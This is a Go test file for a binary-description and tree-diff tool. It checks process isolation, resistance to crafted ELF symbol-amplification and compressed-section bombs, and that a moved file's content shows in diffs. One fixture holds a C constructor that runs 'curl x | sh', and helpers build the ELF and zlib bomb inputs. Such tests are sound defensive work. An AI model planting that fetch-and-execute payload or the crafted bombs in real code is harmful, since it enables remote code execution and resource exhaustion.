package ecoutil

import (
	"bytes"
	"compress/zlib"
	"context"
	"debug/elf"
	"encoding/binary"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"
)

// TestMain doubles as the describe-binary child for the isolation tests:
// ECOUTIL_TEST_CHILD selects a behaviour.
func TestMain(m *testing.M) {
	switch os.Getenv("ECOUTIL_TEST_CHILD") {
	case "":
		os.Exit(m.Run())
	case "ok":
		if err := ChildMain(os.Stdin, os.Stdout); err != nil {
			os.Exit(1)
		}
	case "hang":
		time.Sleep(time.Hour)
	case "crash":
		os.Exit(3)
	case "garbage":
		fmt.Print("not json")
	case "alloc":
		// What an amplifying parser does: allocate past the limit.
		if err := limitMemory(childMemory); err != nil {
			os.Exit(1)
		}
		var keep [][]byte
		for range 4 * (childMemory >> 28) {
			b := make([]byte, 1<<28)
			for i := 0; i < len(b); i += 4096 {
				b[i] = 1
			}
			keep = append(keep, b)
		}
		fmt.Printf(`{"text":"allocated %d","complete":true,"used":0}`, len(keep))
	}
	os.Exit(0)
}

func childIsolation(t *testing.T, mode string, timeout time.Duration) *Isolation {
	t.Helper()
	return &Isolation{Command: []string{os.Args[0]}, Env: []string{"ECOUTIL_TEST_CHILD=" + mode}, Timeout: timeout}
}

func withIsolation(t *testing.T, i *Isolation) {
	t.Helper()
	prev := isolation
	Isolate(i)
	t.Cleanup(func() { Isolate(prev) })
}

// TestIsolatedStructure (security review M1): the structure step runs in
// the child; a child that hangs, crashes or answers garbage yields "not
// structured", never a crash or a hang of the gate.
func TestIsolatedStructure(t *testing.T) {
	self, err := os.ReadFile(os.Args[0])
	if err != nil {
		t.Fatal(err)
	}
	local := DescribeBinary(self, nil, false, nil)

	withIsolation(t, childIsolation(t, "ok", time.Minute))
	got := DescribeBinary(self, nil, false, nil)
	if !reached(got) || got.Text != local.Text {
		t.Errorf("child rendering differs from the local one (complete %v)", reached(got))
	}
	for mode, want := range map[string]string{"hang": "timed out", "crash": "failed", "garbage": "returned no valid result"} {
		withIsolation(t, childIsolation(t, mode, 2*time.Second))
		start := time.Now()
		d := DescribeBinary(self, nil, false, nil)
		if reached(d) || !strings.Contains(d.Text, "the isolated parser "+want) {
			t.Errorf("%s: complete %v, text %.300s", mode, reached(d), d.Text)
		}
		if time.Since(start) > 30*time.Second {
			t.Errorf("%s took %v", mode, time.Since(start))
		}
		if !strings.Contains(d.Text, "sha256: ") {
			t.Errorf("%s: the generic facts are missing", mode)
		}
	}
}

func TestChildMemoryLimit(t *testing.T) {
	if runtime.GOOS != "linux" {
		t.Skip("RLIMIT_AS is enforced on Linux only")
	}
	withIsolation(t, childIsolation(t, "alloc", time.Minute))
	res := isolation.run([]byte("\x7fELF"), 0, Generic)
	if res.Complete {
		t.Errorf("a child allocating %d bytes was not stopped: %+v", 4*childMemory, res)
	}
}

// craftELF: nsyms symbols whose names all point at one L-byte string
// (the review's PoC).
func craftELF(nsyms, L int) []byte {
	shstr := []byte("\x00.symtab\x00.strtab\x00.shstrtab\x00")
	strtab := append(append([]byte{0}, bytes.Repeat([]byte("A"), L)...), 0)
	sym := make([]byte, 24*(nsyms+1))
	for i := 1; i <= nsyms; i++ {
		binary.LittleEndian.PutUint32(sym[24*i:], 1)
	}
	return elfWith(sym, strtab, shstr, 0)
}

func elfWith(sym, strtab, shstr []byte, strFlags uint64) []byte {
	off := 64
	symOff := off
	off += len(sym)
	strOff := off
	off += len(strtab)
	shOff := off
	off += len(shstr)
	var b bytes.Buffer
	h := elf.Header64{Type: uint16(elf.ET_REL), Machine: uint16(elf.EM_X86_64), Version: 1,
		Shoff: uint64(off), Ehsize: 64, Shentsize: 64, Shnum: 4, Shstrndx: 3}
	copy(h.Ident[:], "\x7fELF")
	h.Ident[elf.EI_CLASS] = byte(elf.ELFCLASS64)
	h.Ident[elf.EI_DATA] = byte(elf.ELFDATA2LSB)
	h.Ident[elf.EI_VERSION] = 1
	binary.Write(&b, binary.LittleEndian, h)
	b.Write(sym)
	b.Write(strtab)
	b.Write(shstr)
	for _, s := range []elf.Section64{{},
		{Name: 1, Type: uint32(elf.SHT_SYMTAB), Off: uint64(symOff), Size: uint64(len(sym)), Link: 2, Entsize: 24},
		{Name: 9, Type: uint32(elf.SHT_STRTAB), Flags: strFlags, Off: uint64(strOff), Size: uint64(len(strtab))},
		{Name: 17, Type: uint32(elf.SHT_STRTAB), Off: uint64(shOff), Size: uint64(len(shstr))},
	} {
		binary.Write(&b, binary.LittleEndian, s)
	}
	return b.Bytes()
}

func allocated(f func()) uint64 {
	var m0, m1 runtime.MemStats
	runtime.GC()
	runtime.ReadMemStats(&m0)
	f()
	runtime.ReadMemStats(&m1)
	return m1.TotalAlloc - m0.TotalAlloc
}

func TestELFSymbolAmplification(t *testing.T) {
	data := craftELF(4096, 64<<10) // 160 KiB that names 4096 symbols of 64 KiB each
	var out Description
	n := allocated(func() { out = DescribeBinary(data, nil, false, &Budget{Left: 128 << 20}) })
	if n > 32<<20 {
		t.Errorf("rendering a %d KiB ELF allocated %d MiB", len(data)>>10, n>>20)
	}
	// .symtab names are never built, only counted (L1): the rendering is
	// complete and says so.
	if !strings.Contains(out.Text, "symbol tables: 4097 symbols (counted, names not read)") || !reached(out) {
		t.Errorf("counts not reported:\n%.1500s", out.Text)
	}
}

func TestELFCompressedSection(t *testing.T) {
	var z bytes.Buffer
	zw, _ := zlib.NewWriterLevel(&z, zlib.BestCompression)
	zero := make([]byte, 1<<20)
	for range 512 {
		zw.Write(zero)
	}
	zw.Close()
	var ch bytes.Buffer
	binary.Write(&ch, binary.LittleEndian, elf.Chdr64{Type: uint32(elf.COMPRESS_ZLIB), Size: 512 << 20, Addralign: 1})
	sym := make([]byte, 48)
	binary.LittleEndian.PutUint32(sym[24:], 1)
	data := elfWith(sym, append(ch.Bytes(), z.Bytes()...), []byte("\x00.symtab\x00.strtab\x00.shstrtab\x00"), uint64(elf.SHF_COMPRESSED))
	bud := &Budget{Left: 128 << 20}
	var out Description
	n := allocated(func() { out = DescribeBinary(data, nil, false, bud) })
	if n > 64<<20 {
		t.Errorf("a compressed section inflated: %d MiB allocated", n>>20)
	}
	if !strings.Contains(out.Text, "(compressed; not inflated)") {
		t.Errorf("compressed section not reported:\n%.1500s", out.Text)
	}
	if used := 128<<20 - bud.Left; used > int64(len(data)) {
		t.Errorf("budget charged %d bytes for a %d-byte file", used, len(data))
	}
}

// TestDiffTreesNoRenames (security review H1): a file moved with identical
// bytes (inert testdata text that becomes compiled C) shows its content.
func TestDiffTreesNoRenames(t *testing.T) {
	csrc := "#include <stdlib.h>\n__attribute__((constructor)) static void evil(void) { system(\"curl x | sh\"); }\n" + strings.Repeat("/* padding */\n", 5)
	parent := t.TempDir()
	for root, files := range map[string]map[string]string{
		"old": {"testdata/notes.txt": csrc, "p.go": "package p\n"},
		"new": {"evil.c": csrc, "p.go": "package p\n"},
	} {
		for n, d := range files {
			p := filepath.Join(parent, root, n)
			os.MkdirAll(filepath.Dir(p), 0o755)
			os.WriteFile(p, []byte(d), 0o644)
		}
	}
	diffs, _, err := DiffTrees(context.Background(), t.TempDir(), parent, "old", "new")
	if err != nil {
		t.Fatal(err)
	}
	text, _ := JoinDiffs(diffs, nil)
	if !strings.Contains(string(text), "+__attribute__((constructor)) static void evil(void)") {
		t.Errorf("the moved file's content is not in the diff:\n%s", text)
	}
}
